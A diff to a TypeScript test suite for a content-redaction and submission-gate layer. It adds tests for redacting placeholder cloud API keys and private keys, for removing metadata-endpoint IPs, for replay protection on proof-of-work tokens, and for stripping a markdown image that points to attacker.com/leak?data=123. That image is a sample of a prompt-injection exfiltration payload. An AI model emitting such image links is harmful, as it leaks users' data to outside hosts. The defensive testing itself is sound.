@@ -69,24 +69,55 @@ describe("Layer 1 & 2: DLP Rule Table (Client Redact vs Server 422 Gate)", () =>
     expect(JSON.stringify(serverRes)).not.toContain("sk-proj-");
   });
 
-  it("redacts high-entropy random tokens while leaving normal prose and identifiers intact", () => {
-    const highEntropyToken = "aB3dE6fG9hJ2kL5mN8pQ1rS4tV7wX0yZ3aB6cD9eF2gH";
-    const text = `Failed to authenticate with bearer token ${highEntropyToken} during retry.`;
+  it("redacts additional cloud API keys (AWS STS, Stripe, GitLab, HuggingFace) and case-insensitive PEM keys", () => {
+    const raw = [
+      "AWS STS ASIAIOSFODNN7EXAMPLE",
+      "Stripe live key sk_live_abcdefghijklmnopqrstuvwxyz012345",
+      "GitLab token glpat-abcdefghijklmnopqrst1234",
+      "HuggingFace token hf_abcdefghijklmnopqrstuvwxyz0123456789",
+      "-----begin private key-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASC\n-----end private key-----",
+      "API_KEY=standalone_secret_without_prefix",
+      "Root file /root/.ssh/id_rsa should be normalized",
+      "Loopback IP 127.0.0.1 and metadata IP 169.254.169.254 must be redacted",
+    ].join("\n");
+
+    const clientRes = evaluateRuleTable(raw, "client");
+    expect(clientRes.kind).toBe("transformed");
+    if (clientRes.kind === "transformed") {
+      expect(clientRes.outputText).not.toContain("ASIAIOSFODNN7EXAMPLE");
+      expect(clientRes.outputText).not.toContain("sk_live_");
+      expect(clientRes.outputText).not.toContain("glpat-");
+      expect(clientRes.outputText).not.toContain("hf_");
+      expect(clientRes.outputText).not.toContain("begin private key");
+      expect(clientRes.outputText).not.toContain("standalone_secret_without_prefix");
+      expect(clientRes.outputText).toContain("~/.ssh/id_rsa");
+      expect(clientRes.outputText).not.toContain("127.0.0.1");
+      expect(clientRes.outputText).not.toContain("169.254.169.254");
+    }
+
+    const serverRes = evaluateRuleTable(raw, "server");
+    expect(serverRes.kind).toBe("dlp_blocked");
+  });
+
+  it("redacts high-entropy random tokens even if they contain underscores", () => {
+    const tokenWithUnderscores = "aB3dE6fG9hJ2kL5mN8pQ1rS4tV7wX0yZ__3aB6cD9eF2gH";
+    const text = `Bearer ${tokenWithUnderscores}`;
 
     const clientRes = evaluateRuleTable(text, "client");
     expect(clientRes.kind).toBe("transformed");
     if (clientRes.kind === "transformed") {
-      expect(clientRes.outputText).toBe(
-        "Failed to authenticate with bearer token [REDACTED] during retry.",
-      );
-      expect(clientRes.redactedCategories).toContain("high_entropy_secret");
+      expect(clientRes.outputText).toBe("Bearer [REDACTED]");
     }
+  });
 
-    const serverRes = evaluateRuleTable(text, "server");
-    expect(serverRes).toEqual({
-      kind: "dlp_blocked",
-      violatedCategories: ["high_entropy_secret"],
-    });
+  it("strips markdown images to prevent automatic exfiltration", () => {
+    const text = "Look at this ![diagram](https://attacker.com/leak?data=123) in post.";
+    const res = evaluateRuleTable(text, "server");
+    expect(res.kind).toBe("transformed");
+    if (res.kind === "transformed") {
+      expect(res.outputText).toBe("Look at this diagram in post.");
+      expect(res.injectionWarnings).toContain("stripped_markdown_image_tag");
+    }
   });
 
   it("redacts .env assignments and normalizes macOS, Linux, and Windows user paths to ~/...", () => {
@@ -301,5 +332,68 @@ describe("Layer 3 & Layer 5: Quarantine Lifecycle + Stateless Hashcash PoW", () 
       nowEpochMs: now,
     });
     expect(reviewGate.kind).toBe("accepted");
+  });
+
+  it("prevents PoW token replay attacks via isTokenSpent and markTokenSpent", async () => {
+    const agent = makeAgent({ isPro: false });
+    const now = 1_760_000_000_000;
+    const spentTokens = new Set<string>();
+
+    const challenge = await issueStatelessPowChallenge({
+      agentId: agent.id,
+      difficultyBits: 4,
+      ttlMs: 60_000,
+      nowEpochMs: now,
+      hmacSecret: TEST_SECRET,
+    });
+    const solved = await solveHashcashChallenge(challenge);
+
+    const firstVerify = await verifyStatelessPow({
+      agentId: agent.id,
+      isPro: false,
+      tokenHeader: solved.token,
+      nonceHeader: solved.nonce,
+      hmacSecret: TEST_SECRET,
+      nowEpochMs: now + 1_000,
+      isTokenSpent: (t) => spentTokens.has(t),
+      markTokenSpent: (t) => spentTokens.add(t),
+    });
+    expect(firstVerify.ok).toBe(true);
+
+    // Second verify with same token should be rejected as already used
+    const replayVerify = await verifyStatelessPow({
+      agentId: agent.id,
+      isPro: false,
+      tokenHeader: solved.token,
+      nonceHeader: solved.nonce,
+      hmacSecret: TEST_SECRET,
+      nowEpochMs: now + 2_000,
+      isTokenSpent: (t) => spentTokens.has(t),
+      markTokenSpent: (t) => spentTokens.add(t),
+    });
+    expect(replayVerify).toEqual({ ok: false, reason: "challenge_already_used" });
+  });
+
+  it("rejects submissions with excessive reasoning trace items (>25) to prevent DoS", async () => {
+    const proAgent = makeAgent({ isPro: true });
+    const trace = Array.from({ length: 30 }, (_, i) => ({
+      step: `Step ${i}`,
+      observation: `Observation ${i}`,
+    }));
+
+    const result = await verifyServerSubmissionGate({
+      rawBody: {
+        title: "Large Trace Test",
+        content_md: "Valid content markdown here",
+        reasoning_trace: trace,
+      },
+      agent: proAgent,
+      powTokenHeader: undefined,
+      powNonceHeader: undefined,
+      hmacSecret: TEST_SECRET,
+      nowEpochMs: 1_760_000_000_000,
+    });
+
+    expect(result.kind).toBe("schema_invalid");
   });
 });
